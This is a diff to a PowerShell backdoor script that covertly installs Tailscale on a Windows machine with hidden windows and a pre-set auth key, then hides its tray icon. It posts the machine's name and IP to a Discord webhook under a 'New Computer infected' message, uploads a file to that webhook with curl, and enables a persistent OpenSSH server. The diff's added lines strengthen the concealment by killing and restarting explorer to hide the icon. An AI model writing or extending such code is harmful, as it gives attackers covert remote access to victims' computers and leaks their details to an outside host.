@@ -112,7 +112,7 @@ Begin
 Process
 {
     # 0=only show notifications, 1=hide, 2=show icon and notifications
-    $Setting = 2
+    $Setting = 1
     if ($Hide) { $Setting = 1 }
 
     $trayNotifyPath = (Get-Item $TrayNotifyKey).PSPath
@@ -191,21 +191,19 @@ Set-Location $dirName
 
 ## Install Tailscale and take ip
 installTailscale -authKey $authKey -path $temp/$dirName 
-$ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 Set-Location $PSScriptRoot
 
 Start-Sleep 5
  
-Set-Location C:\Tailscale\
-Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
-Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
-Set-Location $temp\$dirName
+
+Start-Process -FilePath "C:\Tailscale\\tailscaled.exe" -windowstyle hidden -Verb RunAs
+Start-Process -FilePath 'C:\Tailscale\tailscale-ipn.exe' -windowstyle hidden -Verb RunAs 
+Start-Process -FilePath "C:\Tailscale\\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
+ 
 
 ## Sends Discord Webhook
 # FIXME: Message isn't beeing send
-Start-Process -FilePath 'C:\Tailscale\tailscale-ipn.exe' 
-Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
-
+$ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
 $description = @"
 New Computer infected 
@@ -223,7 +221,9 @@ $payload = @{
 }
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
 curl.exe -F "file1=@./$env:computername.fk" $Webhook
+taskkill.exe /im explorer.exe /F
 removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide
+Start-Process explorer.exe
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
